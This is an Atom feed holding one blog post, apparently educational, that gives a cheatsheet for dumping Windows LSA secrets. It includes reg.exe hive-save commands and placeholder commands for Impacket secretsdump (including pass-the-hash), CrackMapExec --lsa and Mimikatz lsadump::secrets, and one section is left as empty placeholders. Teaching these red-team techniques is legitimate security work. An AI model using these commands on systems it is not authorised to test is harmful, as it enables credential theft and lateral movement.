<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-10T00:07:27-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Down The Rabbit Hole</title><subtitle>Blog site educating the masses about cybersecurity and ethical hacking</subtitle><author><name>Logan Peterson</name></author><entry><title type="html">OS Credential Dumping: LSA Secrets</title><link href="http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets/" rel="alternate" type="text/html" title="OS Credential Dumping: LSA Secrets" /><published>2021-11-29T00:00:00-08:00</published><updated>2021-11-29T00:00:00-08:00</updated><id>http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets</id><content type="html" xml:base="http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;LSA secrets is part of the data that is stored within the Local Security Authority (LSA) in Windows. LSA itself is utilized to store private data all things revolving around passwords hence why we might care about it. They live within the registry and can be found at &lt;strong&gt;HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets&lt;/strong&gt;. Naturally since its in the registry, in order to do anything with it, we’ll need to have administrative access to the system in question. So in for a penny, in for a pound…&lt;/p&gt;

&lt;h1 id=&quot;cheatsheet&quot;&gt;Cheatsheet&lt;/h1&gt;
&lt;p&gt;Most of these methods will work without any extra work, but for reference I’ll add alternatives to each incase you dont have cleartext password of the user involved, in which case the NTLM hash of the user will be sufficient. If all else fails you can manually save the registry files and export them to your attacking machine and manipulate them as needed. Also, this list will not be exhaustive, as during my research a lot of these tools just piggy back off of each other so I’ll list the most common/popular ones that I’ve seen and used myself.&lt;/p&gt;

&lt;h2 id=&quot;save-registry-files&quot;&gt;Save Registry Files:&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\SYSTEM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\SECURITY&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\SYSTEM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;impacket-secretsdump&quot;&gt;Impacket SecretsDump:&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;    python3 secretsdump.py &amp;lt;AD FQDN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;IP ADDRESS&amp;gt;
    python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; &amp;lt;NTLM FULL HASH&amp;gt; &amp;lt;FQDN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;IP ADDRESS&amp;gt;
    python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; &amp;lt;SAMNAME&amp;gt; &lt;span class=&quot;nt&quot;&gt;-security&lt;/span&gt; &amp;lt;SECURITYNAME&amp;gt; &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; &amp;lt;SYSTEMNAME&amp;gt; LOCAL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;crackmapexec&quot;&gt;CrackMapExec:&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;    crackmapexec smb &amp;lt;IP ADDRESS OR RANGE&amp;gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &amp;lt;USERNAME&amp;gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;PASSWORD&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--lsa&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;mimikatz&quot;&gt;Mimikatz:&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsadump::secrets&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/system:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LOCATION&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OF&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SYSTEM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;REG&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/security:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LOCATION&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OF&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SECURITY&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;down-the-rabbit-hole&quot;&gt;Down The Rabbit Hole&lt;/h1&gt;
&lt;p&gt;##
##
##&lt;/p&gt;

&lt;h1 id=&quot;tool-references&quot;&gt;Tool References&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py&quot;&gt;Impacket SecretsDump&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec&quot;&gt;CrackMapExec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;Mimikatz&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://attack.mitre.org/techniques/T1003/004/&quot;&gt;https://attack.mitre.org/techniques/T1003/004/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration/&quot;&gt;https://www.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.passcape.com/index.php?section=docsys&amp;amp;cmd=details&amp;amp;id=23&quot;&gt;https://www.passcape.com/index.php?section=docsys&amp;amp;cmd=details&amp;amp;id=23&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets&quot;&gt;https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Logan Peterson</name></author><category term="CredentialAccess" /><category term="CredentialDumping" /><summary type="html">Introduction LSA secrets is part of the data that is stored within the Local Security Authority (LSA) in Windows. LSA itself is utilized to store private data all things revolving around passwords hence why we might care about it. They live within the registry and can be found at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets. Naturally since its in the registry, in order to do anything with it, we’ll need to have administrative access to the system in question. So in for a penny, in for a pound…</summary></entry></feed>